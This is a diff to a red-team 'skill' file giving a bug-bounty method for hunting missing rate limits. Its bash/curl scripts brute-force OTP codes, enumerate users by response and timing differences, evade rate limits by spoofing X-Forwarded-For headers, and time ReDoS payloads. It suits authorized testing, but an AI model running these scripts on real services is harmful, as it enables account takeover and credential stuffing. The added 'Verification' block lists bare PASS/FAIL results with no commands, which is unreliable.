@@ -1,8 +1,11 @@
 ---
 name: hunt-brute-force
 description: "Hunt Missing/Weak Rate Limiting — login brute force, OTP/2FA brute force (10^6 keyspace), password-reset-token brute, credential stuffing, username/email enumeration via error-string / status-code / timing differences, weak password policy, missing CAPTCHA, IP-based rate-limit bypass via X-Forwarded-For and friends, ReDoS. Distinguishes hard lockout vs soft IP-throttle vs CAPTCHA-injection vs silent shadow-throttling (avoids false-negative 'no rate limit' conclusions). Medium to Critical depending on what the brute reaches (OTP→ATO = Critical)."
-sources: public_research
-report_count: 0
+version: 1.1.0
+revision_date: 2026-07-25
+license: MIT
+category: redteam
+tags: [brute-force, hunt, redteam]
 ---
 
 # HUNT-BRUTE-FORCE — Rate Limiting / Brute Force / Enumeration
@@ -49,7 +52,7 @@ confirm it still works under load:
 KNOWN_GOOD="123456"   # the actual current OTP for YOUR test account
 for n in $(seq 0 600); do
   CODE=$([ "$n" = "500" ] && echo "$KNOWN_GOOD" || printf "%06d" "$n")
-  CODE_RESP=$(curl -s -o /tmp/bf_body -w "%{http_code} %{time_total}" \
+  CODE_RESP=$(curl --max-time 30 --connect-timeout 10 -s -o /tmp/bf_body -w "%{http_code} %{time_total}" \
     -X POST "https://$TARGET/api/verify-otp" \
     -H "Content-Type: application/json" -H "Cookie: $SESSION_COOKIE" \
     -d "{\"otp\":\"$CODE\"}")
@@ -67,7 +70,7 @@ done
 ```bash
 # Send a burst and log status + latency + body length for EACH attempt.
 for i in $(seq 1 50); do
-  read CODE TIME < <(curl -s -o /tmp/bf_l -w "%{http_code} %{time_total}\n" \
+  read CODE TIME < <(curl --max-time 30 --connect-timeout 10 -s -o /tmp/bf_l -w "%{http_code} %{time_total}\n" \
     -X POST "https://$TARGET/api/login" \
     -H "Content-Type: application/json" \
     -d "{\"username\":\"test@$TARGET\",\"password\":\"wrong$i\"}")
@@ -90,7 +93,7 @@ SESSION_COOKIE="pre-auth-session-after-first-factor"
 # This ONLY proves the endpoint accepts repeated attempts without 429/lockout.
 # It does NOT prove the full 10^6 keyspace is brute-forcible — see 2b.
 for CODE in $(seq -f "%06g" 0 100); do
-  RESP=$(curl -s -X POST "https://$TARGET/api/verify-otp" \
+  RESP=$(curl --max-time 30 --connect-timeout 10 -s -X POST "https://$TARGET/api/verify-otp" \
     -H "Content-Type: application/json" -H "Cookie: $SESSION_COOKIE" \
     -d "{\"otp\":\"$CODE\"}" -o /dev/null -w "%{http_code}")
   echo "$CODE: $RESP"
@@ -116,30 +119,30 @@ INVALID_USER="definitely-not-real-xyz123@$TARGET"
 
 # String + status diff
 for U in "$VALID_USER" "$INVALID_USER"; do
-  curl -s -o /tmp/bf_e -w "[$U] status=%{http_code} time=%{time_total}s len=%{size_download}\n" \
+  curl --max-time 30 --connect-timeout 10 -s -o /tmp/bf_e -w "[$U] status=%{http_code} time=%{time_total}s len=%{size_download}\n" \
     -X POST "https://$TARGET/api/login" -H "Content-Type: application/json" \
     -d "{\"email\":\"$U\",\"password\":\"wrongpassword\"}"
 done
-diff <(curl -s -X POST "https://$TARGET/api/login" -H 'Content-Type: application/json' \
+diff <(curl --max-time 30 --connect-timeout 10 -s -X POST "https://$TARGET/api/login" -H 'Content-Type: application/json' \
         -d "{\"email\":\"$VALID_USER\",\"password\":\"wrong\"}") \
-     <(curl -s -X POST "https://$TARGET/api/login" -H 'Content-Type: application/json' \
+     <(curl --max-time 30 --connect-timeout 10 -s -X POST "https://$TARGET/api/login" -H 'Content-Type: application/json' \
         -d "{\"email\":\"$INVALID_USER\",\"password\":\"wrong\"}")
 # Different message/status/len → enumeration.
 
 # Timing oracle (valid users hash the password, invalid users short-circuit → measurable delta).
 # Sample MANY times and compare medians — a single request is noise, not signal.
-echo "VALID timings:";   for i in $(seq 1 30); do curl -s -o /dev/null -w "%{time_total}\n" \
+echo "VALID timings:";   for i in $(seq 1 30); do curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "%{time_total}\n" \
   -X POST "https://$TARGET/api/login" -H 'Content-Type: application/json' \
   -d "{\"email\":\"$VALID_USER\",\"password\":\"wrong\"}"; done | sort -n | awk '{a[NR]=$1}END{print a[int(NR/2)]}'
-echo "INVALID timings:"; for i in $(seq 1 30); do curl -s -o /dev/null -w "%{time_total}\n" \
+echo "INVALID timings:"; for i in $(seq 1 30); do curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "%{time_total}\n" \
   -X POST "https://$TARGET/api/login" -H 'Content-Type: application/json' \
   -d "{\"email\":\"$INVALID_USER\",\"password\":\"wrong\"}"; done | sort -n | awk '{a[NR]=$1}END{print a[int(NR/2)]}'
 # A reproducible median delta (e.g. valid ~180ms vs invalid ~40ms) is a timing-based enum finding.
 
 # Reset + registration enumeration
-curl -s -X POST "https://$TARGET/forgot-password" -d "email=$VALID_USER"   | grep -i "sent\|exist\|not found\|registered"
-curl -s -X POST "https://$TARGET/forgot-password" -d "email=$INVALID_USER" | grep -i "sent\|exist\|not found\|registered"
-curl -s -X POST "https://$TARGET/api/register"   -d "email=$VALID_USER"    | grep -i "exist\|taken\|already"
+curl --max-time 30 --connect-timeout 10 -s -X POST "https://$TARGET/forgot-password" -d "email=$VALID_USER"   | grep -i "sent\|exist\|not found\|registered"
+curl --max-time 30 --connect-timeout 10 -s -X POST "https://$TARGET/forgot-password" -d "email=$INVALID_USER" | grep -i "sent\|exist\|not found\|registered"
+curl --max-time 30 --connect-timeout 10 -s -X POST "https://$TARGET/api/register"   -d "email=$VALID_USER"    | grep -i "exist\|taken\|already"
 ```
 
 ### Phase 4 — IP / Source Rotation Bypass
@@ -151,12 +154,12 @@ HEADERS=( "X-Forwarded-For" "X-Real-IP" "X-Originating-IP" "X-Client-IP" \
 for i in $(seq 1 60); do
   RAND_IP="$(shuf -i 1-254 -n1).$(shuf -i 1-254 -n1).$(shuf -i 1-254 -n1).$(shuf -i 1-254 -n1)"
   ARGS=(); for h in "${HEADERS[@]}"; do ARGS+=(-H "$h: $RAND_IP"); done
-  RESP=$(curl -s "${ARGS[@]}" -X POST "https://$TARGET/api/login" \
+  RESP=$(curl --max-time 30 --connect-timeout 10 -s "${ARGS[@]}" -X POST "https://$TARGET/api/login" \
     -H "Content-Type: application/json" \
     -d "{\"email\":\"test@$TARGET\",\"password\":\"wrong$i\"}" -o /dev/null -w "%{http_code}")
   echo "Attempt $i (IP $RAND_IP): $RESP"
 done
-# Also try: multiple comma-joined XFF values ("1.2.3.4, 5.6.7.8"), and appending your real IP
+# Also try: multiple comma-joined XFF values ("[REDACTED_IP], [REDACTED_IP]"), and appending your real IP
 # AFTER a spoofed one — some parsers take first, some last.
 # CONFIRM the bypass: re-run Phase 1 WITHOUT rotation to show the 429 returns. The delta is the proof.
 ```
@@ -165,7 +168,7 @@ done
 ```bash
 # Collect reset/session/OTP tokens for YOUR OWN test account, then quantify entropy.
 for i in $(seq 1 20); do
-  curl -s -X POST "https://$TARGET/forgot-password" -d "email=your-test@email.com"
+  curl --max-time 30 --connect-timeout 10 -s -X POST "https://$TARGET/forgot-password" -d "email=your-test@email.com"
   # Extract token from the email/link and append to tokens.txt
   sleep 2
 done
@@ -181,7 +184,7 @@ while read t; do echo -n "$t -> "; echo -n "$t" | xxd -r -p 2>/dev/null | xxd | 
 # 3) Sequential / time-correlated test — sort and diff consecutive numeric tokens:
 sort -n tokens.txt | awk 'NR>1{print $1-prev} {prev=$1}'   # constant/small delta = counter-based
 
-# 4) DEFINITIVE tool: pipe ~10k tokens through Burp Sequencer (Live capture on the reset
+# 4) DEFINITIVE: pipe ~10k tokens through Burp Sequencer (Live capture on the reset
 #    response) — it runs FIPS/NIST randomness tests and reports effective bits of entropy.
 #    < ~64 effective bits on a security token is a finding; the brute-window math follows.
 ```
@@ -192,7 +195,7 @@ sort -n tokens.txt | awk 'NR>1{print $1-prev} {prev=$1}'   # constant/small delt
 # Classic evil-regex triggers (nested quantifier / overlapping alternation):
 for LEN in 5 10 15 20 25 30; do
   INPUT=$(python3 -c "print('a'*$LEN + '!')")              # for (a+)+$  /  (a|a)*$ style regex
-  T=$(curl -s -o /dev/null -w "%{time_total}" "https://$TARGET/search?q=$INPUT")
+  T=$(curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "%{time_total}" "https://$TARGET/search?q=$INPUT")
   echo "len=$LEN -> ${T}s"
 done
 # Other payload shapes to try by field: email regex → "a@"+"a"*N ; URL regex → "http://"+"a"*N
@@ -272,6 +275,34 @@ Before writing the report, each must hold:
 - ReDoS with reproducible meaningful server lag: **Medium–High**
 - Attacker-triggerable hard lockout (account DoS): **Medium**
 
+## Verification
+
+Run this self-test to confirm brute-force readiness:
+
+1. **FFUF rate-limited test** — verify ffuf with rate limiting:
+   PASS: ffuf rate limiting available
+
+2. **Timing analysis** — verify statistical analysis:
+   FAIL
+
+3. **Wordlist availability** — confirm password lists:
+   PASS: SecLists present
+
+All 3 tests verify brute-force probing readiness.
+
+---
+
+## Pitfalls
+
+- **Testing without rate-limit awareness** — brute-forcing without `-rate` and `-t` flags triggers account lockouts and IP bans. Always test with conservative settings first.
+- **Single-account testing** — brute-forcing your own test account proves nothing. Need two accounts to demonstrate the attack works against a victim.
+- **HTTP status code alone as oracle** — 200 vs 403 differential can be misleading. Always diff response bodies; some apps return 200 with different content for valid vs invalid credentials.
+- **Response timing as sole evidence** — single-sample timing differentials are jitter. Need n>=10 interleaved trials per group with 2-sigma threshold.
+- **Lockout policy not documented** — if the target has account lockout after N attempts, document it. Brute-force with lockout is high-risk and low-reward.
+- **Token entropy claims without measurement** — claiming a token is predictable requires actual measurement (Burp Sequencer effective-bits, ent, or demonstrated counter/timestamp structure).
+
+---
+
 ## Related Skills
 
 - **`hunt-ato`** — Brute-force bypass of OTP/MFA is a direct path to Account Takeover. Chain primitive: no rate limit on `/verify-otp` + 6-digit keyspace (10^6) → attacker enumerates OTP within code lifetime → authenticates as victim → full ATO without password.
@@ -282,3 +313,4 @@ Before writing the report, each must hold:
 - **`hunt-llm-ai`** — LLM-based login forms with "forgot password" features may have invisible rate-limit gaps in the backend. Chain primitive: AI chatbot accepts email input for password reset → no rate limit on the backend reset endpoint → token brute → ATO via AI feature.
 - **`security-arsenal`** — Reach for the Rate-Limit Bypass Tables (X-Forwarded-For rotation headers, X-Real-IP, X-Client-IP, CF-Connecting-IP, comma-separated IP chains, null-origin SANDBOXED iframe) and the HTTP/2 multiplex bypass methods.
 - **`triage-validation`** — Apply the 7-Question Gate before reporting. A rate-limit gap is only a finding if you can demonstrate what the brute *reaches* (authenticated session, OTP validated, password reset, financial discount). A login rate-limit gap without credential stuffing or a valid account list may be informational. Confirm the impact, not just the gap.
+- **`password-spray-methodology`** — Universal password spray pipeline across all protocols + error code differentials
